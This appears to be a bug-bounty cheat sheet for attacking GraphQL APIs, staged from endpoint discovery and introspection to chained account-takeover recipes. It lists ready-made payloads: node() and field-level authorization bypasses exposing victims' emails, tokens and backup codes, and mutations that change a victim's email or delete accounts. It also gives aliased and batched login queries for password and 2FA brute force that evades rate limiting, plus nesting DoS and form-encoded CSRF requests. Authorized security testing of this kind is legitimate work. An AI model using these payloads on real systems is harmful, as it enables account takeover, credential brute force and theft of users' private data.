# GraphQL Deep — $25K HackerOne pattern

> H1: HackerOne $25K — private program data disclosure via GraphQL. HackerOne $12.5K — IDOR via GraphQL mutation. GraphQL is consistently underprotected vs REST.

---

## STAGE 1 — Discovery

```
/graphql, /graphiql, /api/graphql, /v1/graphql, /v2/graphql, /query, /api,
/graphql.php, /api/graph, /apollo, /hasura, /relay, /subgraph
/graphql/console, /altair, /playground, /voyager, /explorer
```

Detection by response: `{"errors":[{"message":"Must provide query string."}]}` or HTTP 400 with `errors` field.

```bash
ffuf -w graphql-paths.txt -u https://$T/FUZZ -mc 200,400,405
nuclei -t exposures/apis/graphql-detect.yaml
```

---

## STAGE 2 — Introspection

If introspection is on, you have the entire schema:
```
POST /graphql
{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description args { ...InputValue } } } }"}
```
Tools: **GraphQL Voyager** (visual), **InQL** (Burp ext), **Clairvoyance** (when introspection disabled).

If introspection is **off**:
- **Field suggestions**: error messages reveal nearby field names ("Did you mean `email`?") -> Clairvoyance brute-forces field names from suggestions
- Try common types: `User`, `Account`, `Order`, `Project`, `Repository`, `Comment`, `File`, `Token`, `ApiKey`, `Membership`

---

## STAGE 3 — Authorization holes (the gold)

### `node(id: ...)` global resolver
GraphQL Relay convention exposes:
```graphql
{ node(id: "User:42") { ... on User { email phoneNumber } } }
```
Many apps put authz on `user(id:)` but forget `node()`. Try every type.

### Find leaked global IDs
- Public profile pages -> `id` in JSON
- OG / share-link pages
- Search APIs returning IDs

### Field-level authz holes
Some types have public fields (avatar) and private (email). Authz check is on the *resolver* sometimes, not the *field*. Query private fields directly:
```graphql
{ user(id: "victim") { email twoFactorBackupCodes apiTokens { value } } }
```

### Mutation authz
Less-tested than queries. Try:
```graphql
mutation { updateUser(id: "victim", input: {email: "attacker@x.com"}) { id } }
mutation { deleteAccount(id: "victim") { success } }
mutation { transferOwnership(targetUserId: "victim", resource: "...") }
```

---

## STAGE 4 — Batching attacks

GraphQL allows multiple queries in one HTTP request:
```graphql
[
  {"query":"mutation { login(user:\"victim\", pass:\"a\"){ token } }"},
  {"query":"mutation { login(user:\"victim\", pass:\"b\"){ token } }"},
  ...
]
```
1000 password attempts per HTTP request -> rate limiting won't catch you.

Or aliasing in single query:
```graphql
{
  a: login(user:"v",pass:"a") { token }
  b: login(user:"v",pass:"b") { token }
  c: login(user:"v",pass:"c") { token }
  ...
}
```

Use this for: 2FA brute force, password brute force, voucher/coupon brute force.

---

## STAGE 5 — Depth / complexity DoS

```graphql
{ user(id: "1") { friends { friends { friends { friends { friends { ... } } } } } } }
```
Each level multiplies. Some servers blow up. Note: only test on safe targets / staging.

---

## STAGE 6 — Sensitive operations / forgotten queries

Many GraphQL schemas have:
- `userByEmail(email: "...")` — email enumeration
- `passwordReset(email: "...")` — exposes flow
- `internalAdmin*` queries left enabled
- `_debug`, `_meta`, `_health` types

Once you have schema, grep for: `secret`, `token`, `password`, `key`, `private`, `internal`, `admin`, `debug`.

---

## STAGE 7 — CSRF on GraphQL

Some servers accept `Content-Type: application/x-www-form-urlencoded` — bypasses preflight CORS.
```http
POST /graphql HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: session=victim

query=mutation+%7BdeleteAccount%7D
```
Or with simple JSON form via 307 redirect from text/plain endpoint.

Also check `GET /graphql?query=mutation...` — some servers allow GET mutations.

---

## STAGE 8 — Subscriptions / WebSocket auth

WebSocket handshake auth often passes once; subsequent frames trusted. Can run mutations over WS that aren't allowed via HTTP.

---

## CHAIN RECIPES

### Recipe 1 — node() bypass -> private data
1. Find any `id` value (your own user, your own resource)
2. Increment / mutate to victim's
3. `{ node(id:"User:victim") { ...email and private fields } }`

### Recipe 2 — Mutation IDOR -> ATO
1. `mutation { updateEmail(userId: "victim", email:"attacker@x.com") }`
2. Server doesn't check ownership of `userId`
3. Email change confirmation goes to attacker
4. Confirm -> attacker controls victim email -> reset password -> ATO

### Recipe 3 — Aliased login brute -> creds
1. Schema has `login(user, password)`
2. Build aliased query with rockyou-top-1000 passwords
3. Send 1 request, parse responses for non-error
4. Bypass auth rate limiting

### Recipe 4 — Field-level enum -> mass user disclosure
1. `internalUserCount` query exists, returns number
2. `userByEmail` queries return PII
3. Combine with email list to enumerate company employees

---

## VALIDATION CHECKLIST

- Confirm with two clean accounts
- Capture the malicious query/mutation in full
- Show victim's data clearly accessible
- Distinguish "introspection on but authz fine" (low) from "private data exposed" (high)
- Note batching/alias counts if used

---

## TOOLING

- **InQL** (Burp ext) — schema browser + scan
- **GraphQL Voyager** — visual schema explorer
- **Clairvoyance** — schema reconstruction without introspection
- **GraphQLmap** — automated testing
- **graphql-cop** — common misconfig check
- **GraphQLer** — fuzzer
- nuclei `tags=graphql`
